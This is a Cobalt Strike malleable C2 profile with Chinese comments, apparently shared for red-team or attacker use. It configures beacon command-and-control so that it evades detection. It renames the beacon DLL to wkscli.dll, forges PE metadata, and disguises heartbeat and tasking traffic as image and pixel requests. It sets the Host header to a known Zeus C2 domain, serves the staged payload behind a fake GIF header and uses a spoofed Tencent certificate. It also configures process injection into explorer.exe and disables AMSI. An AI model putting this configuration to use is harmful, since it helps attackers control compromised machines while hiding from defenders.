set sample_name "ex"; # 文件名
set sleeptime "30000";  # 睡眠时间，单位为毫秒
set jitter    "15";		# 抖动频率，百分之15

#set maxdns    "255";	# 通过DNS来上传数据的时候的最大hostname长度
set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36";


stage {	
	set userwx		   "false";
	set obfuscate	   "true";
	set cleanup        "true";
	set checksum       "0";
	set sleep_mask     "true" ;
	set compile_time   "15 May 1980 13:25:14";
	set entry_point    "7440";
	set name           "wkscli.dll";
	set rich_header    "\xa9\x72\xd8\xe1\xed\x13\xb6\xb2\xed\x13\xb6\xb2\xed\x13\xb6\xb2\xb6\x7b\xb7\xb3\xef\x13\xb6\xb2\xe4\x6b\x25\xb2\xc6\x13\xb6\xb2\xed\x13\xb7\xb2\x99\x17\xb6\xb2\xb6\x7b\xb2\xb3\xe4\x13\xb6\xb2\xb6\x7b\xb5\xb3\xef\x13\xb6\xb2\xb6\x7b\xb3\xb3\xfd\x13\xb6\xb2\xb6\x7b\xb6\xb3\xec\x13\xb6\xb2\xb6\x7b\xbb\xb3\xc5\x13\xb6\xb2\xb6\x7b\x4b\xb2\xec\x13\xb6\xb2\xb6\x7b\x49\xb2\xec\x13\xb6\xb2\xb6\x7b\xb4\xb3\xec\x13\xb6\xb2\x52\x69\x63\x68\xed\x13\xb6\xb2\x00\x00\x00\x00\x00\x00\x00\x00";
	# 被编译器插入到PE文件中的元信息

	set stomppe "false"; # 轻度代码混淆
	stringw "nsp.dll"; 
	stringw ".tmp";
	stringw "eqoi.js";
	stringw "SeShutdownPrivilege";
	stringw "guest";
	stringw "TSeTcbPrivilege";
	stringw ".exe";
	stringw "HKLM\\SOFTWARE\\Microsoft";
	stringw "sysvol";
	stringw "Services.msc";
	stringw "wmic";
	stringw "gpedit";
	stringw "kernel32.dll";
	stringw "#1231";
	stringw "wkscli.dll";
	stringw "e.dat";
	stringw "ntdll.dll";
	stringw "del \"%s\"";
	stringw "copy .exe .";
	stringw "systeminfo";
	# 将上述数据添加到.rdata节，以宽字符串的形式(UTF-16LE)

	# 添加以0结尾的字符串。

	# get rid of some standard Cobalt Strike stuff.
	transform-x86 {
		prepend "\xB6\x84\x38";
		strrep "beacon.dll" "wkscli.dll";
		strrep "ReflectiveLoader" "ipconfig";
	}

	transform-x64 {
		prepend "\x90\x90\x90";
		strrep "beacon.x64.dll" "wkscli.dll";
		strrep "ReflectiveLoader" "ipconfig";
	}
}

http-get {

    set uri "/news/pictures/animals/cat.jpg /ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";# 设置get请求涉及到的uri，get请求一般是心跳包，beacon会随机从里面找一个请求

    client {

        header "Accept" "*/*";
        header "Connection" "Close";

        # throw in a known/old Zeus C2 domain
        header "Host" "sharouretarot.com";
        #header "Cache-Control" "max-age=0";
        header "Accetp" "text/html;image/png;";

        # 将元数据放在cookie头中，并进行base64编码。
        metadata {
            base64;
            prepend "uuid_tt_dd=10_306329;tokenInfo=SownINownOnewom";
            append  "/sOBwoNmqvsnw6wo==";
            header "Cookie";
        }
    }

    server {
    # 如果服务端有任务，则会放在http body部分回传给client。
        header "Server" "openresty";
        header "Content-Type" "image/jpeg";
        header "Connection" "close";
        header "X-Powered-By" "PHP/5.3.8.2";
        header "etag" "AAA8B5E75E9B26545E5E2C660A2192AC";
        header "content-md5" "q3i1516bJlReXixmCiGSrA==";
        header "accept-ranges" "bytes";

        output {
        	base64;
        	prepend "JenwOnelwPOJWnNWnibwOBobUWboBOWbjoebowOmMnwnnnBnvTT";

        	append "/wIiWinwUoNbOiwebiUoneOeiwnI";
            print;
        }
    }
    }

http-post {
	# 主要用于传输任务执行结果的回显。

    set uri "/news/messageboard/customer/operation.php";

    client {

        header "Accept" "*/*";
        header "Connection" "Keep-Alive";

        # throw in a known/old Zeus C2 domain
        header "Host" "sharouretarot.com";
        header "Cache-Control" "no-cache";

        id {
            netbios;
            parameter "token_number";
        }

        output {
        	base64;
        	prepend "OnwowIBBv:c2xkbWw7ZnFsO25";
        	append "/sdfbqwiehgpihasoidjgoijqw==";
            print;
        }
    }

    server {
        header "Server" "apache/*";
        header "Content-Type" "text/html";
        header "Connection" "close";
        header "X-Powered-By" "PHP/5.3.8.2";

        output {
        	base64;
        	prepend "info_ejw:ojoiqweoijiowquer=";
            print;
        }
    }
}


http-stager {
	#控制分阶段下载payload的方式
	set uri_x86 "/fish.jpg"; 
	set uri_x64 "/dog.jpg";

	client { 
		parameter "id" "129u19"; 
		header "Cookie" "uuid_tt_dd=10_30632999610-1600137954863-129u19; "; 
	}
	server { 
		header "Content-Type" "image/gif"; 
		output { 
			prepend "GIF89a"; 
			print;
			}
	} 
}
https-certificate {
	set CN "Tecent";
	set  OU "TC";
	set O "Tecent";
	set  L "Beijing";
	set ST "DC";
	set C "US";
}
code-signer{
	set keystore "perfect.store";
	set password "78787878";
	set alias "shanfenglan";
}
http-config{
	set trust_x_forwarded_for "true";
}

process-inject {
	set allocator	"NtMapViewOfSection";
	execute {
		CreateThread "ntdll.dll!NtOpenProcess0x78";
		RtlCreateUserThread;
	}

}



#post-ex控制后渗透模块特定进程注入过程例如hashdump的具体细节
post-ex{
	set spawnto_x86 "%windir%\\syswow64\\explorer.exe"; 
	set spawnto_x64 "%windir%\\explorer.exe";
	set obfuscate "true";
	set smartinject "true";
	set pipename "iwnoqnw_pip";
	set amsi_disable "true";
}

